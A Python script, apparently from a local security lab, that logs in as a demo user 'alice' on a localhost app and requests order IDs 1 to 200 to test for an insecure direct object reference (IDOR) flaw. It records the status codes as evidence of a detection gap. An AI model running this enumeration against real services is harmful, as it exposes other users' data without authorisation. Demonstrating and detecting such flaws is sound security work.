import requests
import json
import time
import os

BASE_URL = "http://127.0.0.1:8000"
RESULTS_PATH = os.path.join(os.path.dirname(__file__), "..", "logs", "idor_results.json")

def main():
    # Log in as alice
    login_resp = requests.post(f"{BASE_URL}/login", params={"username": "alice", "password": "alicepass"})
    login_resp.raise_for_status()
    token = login_resp.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}

    results = []
    status_counts = {}

    print("Running IDOR loop as alice across orders 1-200...")
    for order_id in range(1, 201):
        r = requests.get(f"{BASE_URL}/api/orders/{order_id}", headers=headers)
        results.append({"order_id": order_id, "status": r.status_code})
        status_counts[r.status_code] = status_counts.get(r.status_code, 0) + 1
        time.sleep(0.02)  # small delay so it's readable in the audit log timeline

    # Save full results as evidence
    os.makedirs(os.path.dirname(RESULTS_PATH), exist_ok=True)
    with open(RESULTS_PATH, "w") as f:
        json.dump({
            "attacker": "alice",
            "total_requests": len(results),
            "status_summary": status_counts,
            "results": results
        }, f, indent=2)

    # Print summary to terminal
    total_200 = status_counts.get(200, 0)
    print(f"\n--- Summary ---")
    print(f"Total requests: {len(results)}")
    print(f"Status breakdown: {status_counts}")
    print(f"{total_200}/{len(results)} requests returned 200")
    if status_counts.get(403, 0) == 0 and status_counts.get(401, 0) == 0:
        print("No 403s or 401s at all — a basic error-counter would stay silent.")

if __name__ == "__main__":
    main()